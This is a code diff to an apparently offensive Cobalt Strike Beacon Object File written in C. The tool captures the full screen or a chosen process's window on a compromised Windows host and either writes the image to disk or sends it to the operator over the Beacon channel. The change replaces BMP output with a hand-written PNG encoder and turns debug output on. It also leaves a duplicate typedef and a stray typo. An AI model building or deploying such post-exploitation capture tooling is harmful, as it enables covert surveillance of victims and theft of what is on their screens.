@@ -7,6 +7,8 @@
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Gdi32.lib")
 
+
+
 /*-------------------------------------------------------------
    Typedefs for the winapis im dynamically resolving
 -------------------------------------------------------------*/
@@ -45,6 +47,14 @@ typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
 typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
 typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
 typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);
+
+
+/* PNG conversion */
+
+typedef int      (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
+typedef int      (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
+typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);
+
 
 /*-------------------------------------------------------------
    Declare static pointers for each API
@@ -90,7 +100,7 @@ static PFN_IsWindowVisible        pIsWindowVisible = NULL;
 
    for some reason cobalt has a limit to how many winapis you can use via DFR lol.
    https://github.com/fortra/No-Consolation/issues/5
-   the limit is 32 on 4.9 and 128 on 4.10. To make this 4.9 friendly i had to do this :sob:
+   the limit is 32 on 4.9 and 128 on 4.10. To make this 4.9 friendly i had to do this :sob:q
 -------------------------------------------------------------*/
 void ResolveAPIs(void)
 {
@@ -134,6 +144,10 @@ void ResolveAPIs(void)
     pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
     pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");
 
+    /* PNG conversion */
+    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
+    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
+    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolved hKernel32 to 0x%p", hKernel32);
     
@@ -233,102 +247,269 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
 
     free(packedData);
 }
+static void writeBigEndian32(unsigned char* buf, unsigned long value)
+{
+    buf[0] = (unsigned char)((value >> 24) & 0xFF);
+    buf[1] = (unsigned char)((value >> 16) & 0xFF);
+    buf[2] = (unsigned char)((value >> 8) & 0xFF);
+    buf[3] = (unsigned char)(value & 0xFF);
+}
 
-/*-------------------------------------------------------------
-  Saves (or downloads) the given HBITMAP as a BMP file with
-  the provided file name.
--------------------------------------------------------------*/
+#define CRC32_POLYNOMIAL 0xEDB88320UL
+
+// Compute a CRC32 over buf[0..len-1]
+static unsigned long crc32(const unsigned char* buf, size_t len)
+{
+    unsigned long crc = 0xFFFFFFFF;
+    size_t i, j;
+    for (i = 0; i < len; i++) {
+        crc ^= buf[i];
+        for (j = 0; j < 8; j++) {
+            if (crc & 1)
+                crc = (crc >> 1) ^ CRC32_POLYNOMIAL;
+            else
+                crc >>= 1;
+        }
+    }
+    return crc ^ 0xFFFFFFFF;
+}
+
+// Compute Adler-32 checksum (RFC1950)
+static unsigned long adler32(const unsigned char* data, size_t len)
+{
+    unsigned long a = 1, b = 0;
+    const unsigned long MOD_ADLER = 65521;
+    size_t i;
+    for (i = 0; i < len; i++) {
+        a = (a + data[i]) % MOD_ADLER;
+        b = (b + a) % MOD_ADLER;
+    }
+    return (b << 16) | a;
+}
+
+// -------------------- SaveHBITMAPToFile (PNG version) --------------------
+//
+// This function converts the given HBITMAP into a PNG image (with no compression
+// on the deflate stream – just stored blocks) and then either writes the PNG file to disk
+// (if savemethod==0) or downloads it over Beacon (otherwise).
+//
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
 {
-    ResolveAPIs();
+    ResolveAPIs();  // your API–resolver routine
 
-    HDC hDC;
-    int iBits;
-    WORD wBitCount;
-    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
-    BITMAP Bitmap0;
-    BITMAPFILEHEADER bmfHdr;
+    // First, get the bitmap’s dimensions and force a 24–bit DIB.
+    BITMAP bm;
+    pGetObjectA(hBitmap, sizeof(bm), (LPSTR)&bm);
+    int width = bm.bmWidth;
+    int height = bm.bmHeight;  // original height (may be positive)
+    int absHeight = (height < 0) ? -height : height;  // use absolute value
+
+    // Set up a BITMAPINFOHEADER requesting 24–bit and a top–down DIB (negative height)
     BITMAPINFOHEADER bi;
-    LPBITMAPINFOHEADER lpbi;
-    HANDLE fh;
-    HANDLE hDib, hPal;
-    HGDIOBJ hOldPal2 = NULL;
-
-    hDC = pCreateDC("DISPLAY", NULL, NULL, NULL);
-    iBits = pGetDeviceCaps(hDC, BITSPIXEL) * pGetDeviceCaps(hDC, PLANES);
-    pDeleteDC(hDC);
-    if (iBits <= 1)
-        wBitCount = 1;
-    else if (iBits <= 4)
-        wBitCount = 4;
-    else if (iBits <= 8)
-        wBitCount = 8;
-    else
-        wBitCount = 24;
-
-    pGetObjectA(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
+    memset(&bi, 0, sizeof(bi));
     bi.biSize = sizeof(BITMAPINFOHEADER);
-    bi.biWidth = Bitmap0.bmWidth;
-    /* Negative height makes the bitmap top–down */
-    bi.biHeight = -Bitmap0.bmHeight;
+    bi.biWidth = width;
+    bi.biHeight = -absHeight;  // negative: top–down (so scanlines are in order)
     bi.biPlanes = 1;
-    bi.biBitCount = wBitCount;
+    bi.biBitCount = 24;      // force 24-bit RGB
     bi.biCompression = BI_RGB;
     bi.biSizeImage = 0;
-    bi.biXPelsPerMeter = 0;
-    bi.biYPelsPerMeter = 0;
-    bi.biClrImportant = 0;
-    bi.biClrUsed = 256;
 
-    dwBmBitsSize = (((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8) * Bitmap0.bmHeight;
-    hDib = pGlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
-    lpbi = (LPBITMAPINFOHEADER)pGlobalLock(hDib);
+    // Calculate the DIB row size (each row is padded to a multiple of 4 bytes)
+    int rowSizeDIB = ((width * 3 + 3) & ~3);
+    DWORD dibSize = rowSizeDIB * absHeight;
+
+    // Allocate global memory for BITMAPINFOHEADER + pixel data
+    HANDLE hDib = pGlobalAlloc(GHND, sizeof(BITMAPINFOHEADER) + dibSize);
+    if (!hDib)
+        return FALSE;
+    LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)pGlobalLock(hDib);
+    if (!lpbi) {
+        pGlobalFree(hDib);
+        return FALSE;
+    }
     *lpbi = bi;
 
-    hPal = pGetStockObject(DEFAULT_PALETTE);
-    if (hPal) {
-        HDC hDC2 = pGetDC(NULL);
-        hOldPal2 = pSelectPalette(hDC2, (HPALETTE)hPal, FALSE);
-        pRealizePalette(hDC2);
-        // Do not forget to release DC later.
-        pReleaseDC(NULL, hDC2);
+    // Get the bitmap’s bits
+    HDC hdc = pGetDC(NULL);
+    pGetDIBits(hdc, hBitmap, 0, absHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER),
+        (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
+    pReleaseDC(NULL, hdc);
+
+    // -------- Convert the DIB data into “raw” PNG image data --------
+    // For PNG we need one filter byte per scanline (here we choose filter type 0)
+    // and exactly width*3 bytes of pixel data per row (no padding).
+    int pngRowSize = 1 + width * 3;
+    int pngDataSize = pngRowSize * absHeight;
+    unsigned char* pngRawData = (unsigned char*)malloc(pngDataSize);
+    if (!pngRawData) {
+        pGlobalUnlock(hDib);
+        pGlobalFree(hDib);
+        return FALSE;
     }
 
-    // GetDIBits: use our dynamically resolved function
-    hDC = pGetDC(NULL);
-    pGetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight,
-        (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
-        (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
-    pReleaseDC(NULL, hDC);
+    // Pointer to the DIB pixels (which are stored in BGR order)
+    unsigned char* dibPixels = (unsigned char*)lpbi + sizeof(BITMAPINFOHEADER);
+    for (int y = 0; y < absHeight; y++) {
+        unsigned char* pSrc = dibPixels + y * rowSizeDIB;
+        unsigned char* pDst = pngRawData + y * pngRowSize;
+        pDst[0] = 0; // filter type 0 (no filtering)
+        for (int x = 0; x < width; x++) {
+            // Swap BGR -> RGB
+            unsigned char B = pSrc[x * 3 + 0];
+            unsigned char G = pSrc[x * 3 + 1];
+            unsigned char R = pSrc[x * 3 + 2];
+            pDst[1 + x * 3 + 0] = R;
+            pDst[1 + x * 3 + 1] = G;
+            pDst[1 + x * 3 + 2] = B;
+        }
+    }
+    pGlobalUnlock(hDib);
+    pGlobalFree(hDib);
 
-    bmfHdr.bfType = 0x4D42;  /* 'BM' */
-    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
-    bmfHdr.bfSize = dwDIBSize;
-    bmfHdr.bfReserved1 = 0;
-    bmfHdr.bfReserved2 = 0;
-    bmfHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize;
-    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
-    memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
-    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
+    // -------- Build a minimal zlib (deflate) stream containing the image data --------
+    // We use “stored” (uncompressed) deflate blocks.
+    // First, write the 2–byte zlib header. (0x78, 0x01 is acceptable for no compression.)
+    unsigned char zlibHeader[2] = { 0x78, 0x01 };
 
+    // Calculate Adler–32 checksum of the uncompressed data.
+    unsigned long adler = adler32(pngRawData, pngDataSize);
+
+    // The deflate stream must split the data into blocks of at most 65535 bytes.
+    int numBlocks = (pngDataSize + 65535 - 1) / 65535;
+    int deflateSize = 0;
+    int tmpRemaining = pngDataSize;
+    while (tmpRemaining > 0) {
+        int blockSize = (tmpRemaining > 65535) ? 65535 : tmpRemaining;
+        // Each stored block: 1 byte header + 2 bytes LEN + 2 bytes NLEN + blockSize bytes
+        deflateSize += 1 + 2 + 2 + blockSize;
+        tmpRemaining -= blockSize;
+    }
+    // Total zlib stream size = header (2 bytes) + deflate blocks + Adler (4 bytes)
+    int zlibDataSize = 2 + deflateSize + 4;
+    unsigned char* zlibData = (unsigned char*)malloc(zlibDataSize);
+    if (!zlibData) {
+        free(pngRawData);
+        return FALSE;
+    }
+    int pos = 0;
+    memcpy(zlibData + pos, zlibHeader, 2);
+    pos += 2;
+    int remaining = pngDataSize;
+    int offset = 0;
+    while (remaining > 0) {
+        int blockSize = (remaining > 65535) ? 65535 : remaining;
+        // Write one byte block header: stored block header has BFINAL in LSB.
+        // Set BFINAL = 1 if this is the last block.
+        unsigned char bfinal = (remaining <= 65535) ? 1 : 0;
+        zlibData[pos++] = bfinal;
+        // Write LEN in little-endian.
+        zlibData[pos++] = blockSize & 0xFF;
+        zlibData[pos++] = (blockSize >> 8) & 0xFF;
+        // Write NLEN = one's complement of LEN.
+        unsigned short nlen = (unsigned short)(~blockSize);
+        zlibData[pos++] = nlen & 0xFF;
+        zlibData[pos++] = (nlen >> 8) & 0xFF;
+        // Write the block data.
+        memcpy(zlibData + pos, pngRawData + offset, blockSize);
+        pos += blockSize;
+        offset += blockSize;
+        remaining -= blockSize;
+    }
+    // Append Adler–32 checksum (big–endian)
+    zlibData[pos++] = (adler >> 24) & 0xFF;
+    zlibData[pos++] = (adler >> 16) & 0xFF;
+    zlibData[pos++] = (adler >> 8) & 0xFF;
+    zlibData[pos++] = adler & 0xFF;
+    // pos should now equal zlibDataSize.
+    free(pngRawData);
+
+    // -------- Build the PNG file in memory --------
+    // PNG file consists of:
+    //   PNG signature (8 bytes)
+    //   IHDR chunk (25 bytes: 4+4+13+4)
+    //   IDAT chunk (8 + zlibDataSize + 4)
+    //   IEND chunk (12 bytes)
+    int pngFileSize = 8 + 25 + (8 + zlibDataSize + 4) + 12;
+    unsigned char* pngFile = (unsigned char*)malloc(pngFileSize);
+    if (!pngFile) {
+        free(zlibData);
+        return FALSE;
+    }
+    int writePos = 0;
+    // PNG signature
+    unsigned char pngSignature[8] = { 137,80,78,71,13,10,26,10 };
+    memcpy(pngFile + writePos, pngSignature, 8);
+    writePos += 8;
+
+    // ---- IHDR chunk ----
+    // Length (13 bytes) – big–endian
+    writeBigEndian32(pngFile + writePos, 13);
+    writePos += 4;
+    // Chunk type: "IHDR"
+    memcpy(pngFile + writePos, "IHDR", 4);
+    writePos += 4;
+    // IHDR data:
+    //   width (4 bytes), height (4 bytes), bit depth (1), color type (1),
+    //   compression method (1), filter method (1), interlace method (1)
+    writeBigEndian32(pngFile + writePos, width);
+    writePos += 4;
+    writeBigEndian32(pngFile + writePos, absHeight);
+    writePos += 4;
+    pngFile[writePos++] = 8;  // bit depth = 8 bits per channel
+    pngFile[writePos++] = 2;  // color type = 2 (truecolor, RGB)
+    pngFile[writePos++] = 0;  // compression method
+    pngFile[writePos++] = 0;  // filter method
+    pngFile[writePos++] = 0;  // interlace method
+    // CRC for IHDR (over chunk type and data = 4+13 bytes)
+    unsigned long chunkCRC = crc32(pngFile + 4, 4 + 13);
+    writeBigEndian32(pngFile + writePos, chunkCRC);
+    writePos += 4;
+
+    // ---- IDAT chunk ----
+    writeBigEndian32(pngFile + writePos, zlibDataSize);
+    writePos += 4;
+    memcpy(pngFile + writePos, "IDAT", 4);
+    writePos += 4;
+    memcpy(pngFile + writePos, zlibData, zlibDataSize);
+    writePos += zlibDataSize;
+    chunkCRC = crc32(pngFile + writePos - (4 + zlibDataSize), 4 + zlibDataSize);
+    writeBigEndian32(pngFile + writePos, chunkCRC);
+    writePos += 4;
+    free(zlibData);
+
+    // ---- IEND chunk ----
+    writeBigEndian32(pngFile + writePos, 0);  // zero data length
+    writePos += 4;
+    memcpy(pngFile + writePos, "IEND", 4);
+    writePos += 4;
+    chunkCRC = crc32(pngFile + writePos - 4, 4);  // only "IEND"
+    writeBigEndian32(pngFile + writePos, chunkCRC);
+    writePos += 4;
+    // (writePos should now equal pngFileSize)
+
+    // -------- Write out the PNG file (or download it) --------
     if (savemethod == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving bitmap to disk with filename %s", lpszFileName);
-        fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
-        if (fh == INVALID_HANDLE_VALUE)
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving PNG to disk with filename %s", lpszFileName);
+        HANDLE fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL,
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
+            NULL);
+        if (fh == INVALID_HANDLE_VALUE) {
+            free(pngFile);
             return FALSE;
-        pWriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, &dwWritten, NULL);
+        }
+        DWORD dwWritten = 0;
+        pWriteFile(fh, (LPCVOID)pngFile, pngFileSize, &dwWritten, NULL);
         pCloseHandle(fh);
     }
     else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading bitmap over beacon with filename %s", lpszFileName);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading PNG over beacon with filename %s", lpszFileName);
         downloadFile((char*)lpszFileName, (int)strlen(lpszFileName),
-            (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
+            (char*)pngFile, pngFileSize);
     }
 
-    pGlobalUnlock(hDib);
-    pGlobalFree(hDib);
-    free(bmpdata);
+    free(pngFile);
     return TRUE;
 }
 
@@ -502,7 +683,7 @@ cleanup:
     3. PID: if nonzero, capture that window; if zero, capture the full screen.
 -------------------------------------------------------------*/
 #ifdef BOF
-int debug = 0; // enable the debugging prints
+int debug = 1; // enable the debugging prints
 void go(char* buff, int len)
 {
     ResolveAPIs();  // ensure API pointers are resolved
